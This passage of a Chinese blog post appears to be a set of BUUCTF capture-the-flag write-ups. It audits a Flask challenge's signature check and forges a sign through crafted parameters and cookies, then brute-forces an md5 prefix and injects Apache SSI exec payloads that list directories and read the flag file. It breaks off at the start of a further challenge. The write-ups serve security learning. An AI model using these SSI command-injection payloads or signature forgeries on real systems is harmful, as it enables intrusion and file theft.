class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(<span class="variable language_">self</span>.action, <span class="variable language_">self</span>.param) == <span class="variable language_">self</span>.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>) </span><br></pre></td></tr></table></figure><p>先看看本题的三个路由</p><p><strong>/geneSign</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><p>产生签名，调用 getSign 函数</p><p><strong>/De1ta</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))<span class="comment">#request.args就是获取请求链接中 ? 后面的所有参数</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure><p>获取 cookies 的 action、sign 和 get 的 param 值，然后 param 要经过 waf 验证，然后调用 Task 类，调用 Exec 方法后以 json 形式返回结果</p><p><strong>/</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>获取源码</p><p>然后是函数</p><p><strong>getSign</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>把 secert_key、param、action 拼接起来，返回 md5 加密十六进制数据字符串值</p><p><strong>waf</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>找到以 gopher 或 file 开头的，如果存在返回 True，在路由 <code>/De1ta</code>  中返回 <code>&quot;No Hacker!!!!&quot;</code>  字样，达成过滤作用</p><p><strong>解法一：字符串拼接</strong></p><p>仔细审计代码，可以知道读取 flag 应该在 Task 类中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        <span class="variable language_">self</span>.action = action</span><br><span class="line">        <span class="variable language_">self</span>.param = param</span><br><span class="line">        <span class="variable language_">self</span>.sign = sign</span><br><span class="line">        <span class="variable language_">self</span>.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.sandbox)):</span><br><span class="line">            <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(<span class="variable language_">self</span>.sandbox)</span><br><span class="line">     <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">self</span>.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(<span class="variable language_">self</span>.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(<span class="variable language_">self</span>.action, <span class="variable language_">self</span>.param) == <span class="variable language_">self</span>.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment">#generate Sign For Action Scan.</span></span><br></pre></td></tr></table></figure><p>想要读取 flag， <code>resp = scan(self.param)</code>  要让 param 为 flag，且是在路由 <code>/De1ta</code>  内，所以可以知道路由应该传入的 param 应该是 flag.txt（根据 hint 知道 flag 在哪个文件内），满足两个 if 条件，action 应该为 readscan，问题存在 sign 之中，可以在 checkSign 函数中看到 <code>getSign(self.action, self.param) == self.sign</code>  这个条件，action 和 param 传到 getSign 函数内为 <code>flag.txtreadscan</code> ，这就是我们要获得的 md5 加密前的内容，现在就是要想办法获取到一模一样的 md5 值</p><p>回到路由 <code>/geneSign</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><p>可以看到 action 在传入 getSign 函数之前就被直接确定了，为 scan，所以要获得到 <code>flag.txtreadscan</code> ，就得从利用 get 方法得到的 param 入手，此时我们将 param 赋值为 <code>flag.txtread</code> ，这样就完成了 <code>flag.txtreadscan</code>  的构造，就能得到 sign</p><p>上图</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c5.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  get参数</span><br><span class="line">?param=flag.txtread</span><br></pre></td></tr></table></figure><p>得到 sign 为 <code>cb60be9fe5b5ca01e83285ee2606d447</code></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c6.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#get 参数</span><br><span class="line">?param=flag.txt</span><br><span class="line"># 添加Cookie</span><br><span class="line">Cookie: action=readscan;sign=cb60be9fe5b5ca01e83285ee2606d447</span><br></pre></td></tr></table></figure><p 7c4a5210-3575-465a-bee8-afbd3e25a5e0>得到 flag，flag</p><h2 id="bjdctf2020easysearch"><a class="markdownIt-Anchor" href="#bjdctf2020easysearch">#</a> [BJDCTF2020]EasySearch</h2><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c7.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>常用的用户名爆破不进去，扫描看看，扫了半天都扫不出来，看了别的大佬的 wp 知道是 <code>index.php.swp</code></p><p>很坑的是大部分扫描的爆破字典有 <code>.index.php.swp</code> ，但是没有 <code>index.php.swp</code> 。。。需要自己手动添加，比如说 dirsearch，自己在 db 目录下找到爆破字典添加进去扫描</p><p>最后扫出来 <code>index.php.swp</code></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c8.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>最后得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>如果 password 经过 md5 加密之后得到的前六位是 6d0bc1 就可以创建一个 shtml 文件</p><p>写脚本跑个 md5 值出来吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000000</span>):</span><br><span class="line">    md5 = hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> md5[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&#x27; md5: &#x27;</span> +md5)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我这个 i 的范围有点大了，可以调小一点，我跑的时候去干别的了，也不知道跑了多久</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c9.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>用前几个就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2020666 md5: 6d0bc1153791aa2b4e18b4f344f26ab4</span><br><span class="line">2305004 md5: 6d0bc1ec71a9b814677b85e3ac9c3d40</span><br><span class="line">9162671 md5: 6d0bc11ea877b37d694b38ba8a45b19c</span><br></pre></td></tr></table></figure><p>文件头里面可以找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Url_is_here: public/34edd56db626d46692e3578274a184957ae846da.shtml</span><br></pre></td></tr></table></figure><p>访问一下<img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c11.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>更换 username 发现，hello 后面跟着的是 username，如果修改呢，有点像 SSTI 注入那种感觉，查了一下 shtml 相关的漏洞，查到 <code>Apache SSI 远程命令执行漏洞（SSI注入漏洞）</code> ，链接：<a href="https://blog.csdn.net/qq_45521281/article/details/107576959">https://blog.csdn.net/qq_45521281/article/details/107576959</a></p><p>使用 ssi 注入漏洞，尝试获取目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls&quot;--&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c13.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c12.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这层目录没有看到啥有用的东西，查看上层</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c14.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_990c66bf85a09c664f0b6741840499b2</span><br></pre></td></tr></table></figure><p>获取 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c15.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 41373a30-b7c1-4721-a30c-b93515021658>得到 flag，flag</p><h2 id="极客大挑战-2019rce-me"><a class="markdownIt-Anchor" href="#极客大挑战-2019rce-me">#</a> [极客大挑战 2019] RCE ME</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 